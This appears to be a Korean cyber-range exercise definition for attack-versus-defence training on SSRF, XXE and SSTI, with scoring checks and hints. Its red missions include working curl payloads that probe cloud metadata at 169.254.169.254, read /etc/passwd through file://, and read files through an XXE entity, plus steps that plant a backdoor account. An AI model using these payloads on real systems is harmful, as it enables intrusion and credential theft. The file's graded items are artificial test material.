@@ -1,0 +1,242 @@
+id: "attack-adv-w04"
+category: "attack-adv"
+title: "[공격고급 W4] 웹 고급 공격 — SSRF/XXE/SSTI vs 고급 웹 탐지"
+difficulty: "hard"
+time_limit: 3000
+battle_type: "1v1"
+description: |
+  공격 고급과정 4주차 — **웹 고급 공격**. SSRF(서버측 요청 위조), XXE(XML 외부 엔티티), SSTI(템플릿 주입),
+  역직렬화 등 OWASP 상위 고급 취약점을 다룬다. Red 는 이를 익스플로잇하고, Blue 는 고급 웹 공격을 탐지한다.
+
+  ▸ 이야기
+    공격자가 SSRF 로 내부/클라우드 메타데이터에 접근하고, XXE 로 서버 파일을 읽고, SSTI 로 원격 코드 실행
+    발판을 만든다. 방어자는 이 고급 페이로드를 탐지하고 위험도를 평가한다.
+
+  ▸ 모드
+    • solo : 한 학생이 익스플로잇(자기 인프라 표적)과 탐지를 모두. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라를 공격, Blue 는 자기 인프라에서 탐지.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 기준. Red 채점은 **대상 인프라의 흔적(WAF audit / RCE 발판·계정)** 으로 한다.
+
+  ▸ 이번 주차 전용 마커
+    공격 태그 **`aa04r1-<본인id>`**, RCE 발판 파일 **`/tmp/.aa04rce`**(마커 `aa04`), 계정 **`atka04`**,
+    Suricata 탐지 **sid 9704011**, Wazuh 탐지 **id 103041**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 22
+    instruction: |
+      ## 🎯 RED-1 [SSRF/XXE] — 서버측 요청 위조 + 외부 엔티티
+
+      ### 상황
+      너는 SSRF 로 내부 주소·클라우드 메타데이터(169.254.169.254)에 접근을 시도하고, XXE 로 서버 파일을 읽는다.
+      태그 `aa04r1-<본인id>` 를 파라미터/페이로드에 단다.
+
+      ### 할 일 (attacker-ext)
+      예시(id=kim):
+      ```bash
+      # SSRF — 내부/메타데이터 접근 시도 (태그 포함)
+      curl -s -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/?url=http://169.254.169.254/latest/meta-data/aa04r1-kim"
+      curl -s -H "Host: dvwa.6v6.lab" "http://<대상_공개IP>/?url=file:///etc/passwd%23aa04r1-kim"
+      # XXE — 외부 엔티티로 파일 읽기 (태그 포함)
+      curl -s -H "Host: dvwa.6v6.lab" -H "Content-Type: application/xml" \
+        --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>aa04r1-kim&x;</r>' \
+        "http://<대상_공개IP>/api/xml"
+      ```
+
+      ### 채점 방법
+      대상 WAF audit(modsec)에 태그 `aa04r1` 가 포함된 SSRF/XXE 탐지가 남았는지로 채점.
+
+      ### 합격 기준
+      대상 WAF audit 에 `aa04r1` 태그가 포함된 SSRF/XXE 흔적이 남는다.
+    hint: "SSRF(169.254.169.254/file://) + XXE(외부 엔티티)에 태그 aa04r1 → 대상 modsec audit. 채점: log_contains modsec aa04r1."
+    verify:
+      type: "log_contains"
+      expect: "aa04r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "aa04r1", since_sec: 1800 } }
+      semantic:
+        intent: "SSRF(T1190)+XXE — 서버측 요청 위조 + 외부 엔티티 파일 읽기. 대상 WAF audit, 태그(aa04r1) 귀속."
+        success_criteria:
+          - "대상 WAF audit 에 aa04r1 태그가 포함된 SSRF/XXE 흔적"
+          - "SSRF 타깃(메타데이터/내부)·XXE 엔티티를 서술"
+        acceptable_methods:
+          - "attacker-ext 에서 태그 단 SSRF/XXE"
+        negative_signs:
+          - "태그 누락 / 대상 미도달"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-2 [SSTI → RCE] — 템플릿 주입으로 코드 실행 발판
+
+      ### 상황
+      SSTI(`{{7*7}}` → `49`)가 통하면 원격 코드 실행으로 이어진다. 너는 SSTI 로 RCE 를 달성해 발판 파일
+      **`/tmp/.aa04rce`**(마커 `aa04`)를 떨구고 계정 **`atka04`** 를 만든다.
+
+      ### 할 일
+      ```bash
+      # (SSTI/RCE 성공을 가정한) 발판 생성
+      printf 'aa04 RCE via SSTI foothold' > /tmp/.aa04rce
+      sudo useradd -m -s /bin/bash atka04
+      ```
+
+      ### 채점 방법
+      대상 호스트에 `/tmp/.aa04rce`(마커 `aa04`)이 있거나 `/etc/passwd` 에 `atka04` 가 있는지로 채점.
+
+      ### 합격 기준
+      `/tmp/.aa04rce`(마커 `aa04`) 또는 계정 `atka04`.
+    hint: "SSTI→RCE 발판 /tmp/.aa04rce (마커 aa04) + useradd atka04. 채점: file_contains 발판 aa04 + file_contains passwd atka04."
+    verify:
+      type: "file_contains"
+      expect: "aa04"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/tmp/.aa04rce", pattern: "aa04" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "atka04" } }
+      semantic:
+        intent: "SSTI→RCE(T1190→T1059) + 계정(T1136) — 템플릿 주입 코드 실행 발판. 후속 장악."
+        success_criteria:
+          - "/tmp/.aa04rce(마커 aa04) 또는 계정 atka04"
+          - "SSTI 표현식과 RCE 연결 서술"
+        acceptable_methods:
+          - "발판 파일 + useradd"
+        negative_signs:
+          - "흔적 미생성"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-1 [SSRF/XXE 탐지] — Suricata 룰 (sid 9704011)
+
+      ### 상황
+      SSRF 의 표적 IP(169.254.169.254)와 file:// 스킴을 잡는 Suricata 룰(**sid 9704011**)을 만든다.
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"ATKADV-W04 SSRF cloud metadata / file scheme"; flow:to_server; http.uri; content:"169.254.169.254"; nocase; sid:9704011; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+
+      ### 채점 방법
+      ips 의 `local.rules` 에 sid 9704011 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local.rules` 에 SSRF 메타데이터 접근을 보는 sid 9704011 룰이 존재한다.
+    hint: "SSRF 메타데이터(169.254.169.254) Suricata 룰(sid 9704011) → reload. 채점: file_contains local.rules 9704011."
+    verify:
+      type: "file_contains"
+      expect: "9704011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9704011" } }
+      semantic:
+        intent: "SSRF 탐지(네트워크) — 클라우드 메타데이터/내부 주소 접근 Suricata 룰. 고급 웹 공격 가시화."
+        success_criteria:
+          - "local.rules 에 sid 9704011 (169.254.169.254)"
+          - "SSRF 가 왜 위험한지(메타데이터 탈취) 서술"
+        acceptable_methods:
+          - "Suricata 룰 작성 + reload"
+        negative_signs:
+          - "패턴 부정확 / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 22
+    instruction: |
+      ## 🛡️ BLUE-2 [SSRF/XXE/SSTI 탐지] — Wazuh 룰 (id 103041)
+
+      ### 상황
+      고급 웹 공격(SSRF/XXE/SSTI)과 그 결과(RCE 발판/계정)를 잡는 Wazuh 룰(**id 103041**)을 만든다.
+
+      ### 할 일
+      ```xml
+      <group name="edu,webadv,">
+        <rule id="103041" level="13">
+          <if_group>edu</if_group>
+          <match>atka04</match>
+          <description>ATKADV-W04 - advanced web attack foothold (SSRF/XXE/SSTI) indicator</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 103041 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local_rules.xml` 에 고급 웹 공격 발판을 보는 id 103041 룰이 존재한다.
+    hint: "고급 웹 공격 발판 Wazuh 룰(id 103041) → restart. 채점: file_contains local_rules.xml 103041."
+    verify:
+      type: "file_contains"
+      expect: "103041"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103041" } }
+      semantic:
+        intent: "고급 웹 공격 탐지(호스트) — SSRF/XXE/SSTI 결과(RCE 발판/계정) Wazuh 룰. 익스플로잇 후 흔적 포착."
+        success_criteria:
+          - "local_rules.xml 에 rule id 103041"
+          - "고급 웹 공격의 호스트 흔적 탐지 로직"
+        acceptable_methods:
+          - "Wazuh 룰 작성 + restart"
+        negative_signs:
+          - "탐지 로직 부실 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [위험도·방어 분석] — 고급 웹 취약점 종합
+
+      ### 상황
+      각 고급 취약점(SSRF/XXE/SSTI/역직렬화/CORS)의 위험도와 방어 방법(입력 검증/엔티티 비활성화/메타데이터
+      차단/샌드박싱)을 정리한다.
+
+      ### 할 일
+      보고서에:
+      - 취약점별 위험도(영향/난이도) + 방어 방법
+      - RCE 발판(`/tmp/.aa04rce`)·계정(atka04) 헌팅 결과
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 위험도·방어 분석으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ 취약점 위험도·방어·헌팅은 제출로 검증).
+    hint: "SSRF/XXE/SSTI/역직렬화/CORS 위험도+방어(입력검증/엔티티 비활성화/메타데이터 차단) + RCE 발판/계정 헌팅. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "고급 웹 취약점 분석 — 위험도 + 방어 방법 + 헌팅. 분석형 — 구체 방어 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "취약점별 위험도 + 방어 방법(입력검증/엔티티 비활성화/메타데이터 차단)"
+          - "RCE 발판/계정 헌팅 결과"
+        acceptable_methods:
+          - "위험도 표 + 방어 + 헌팅"
+        negative_signs:
+          - "방어 방법 누락"
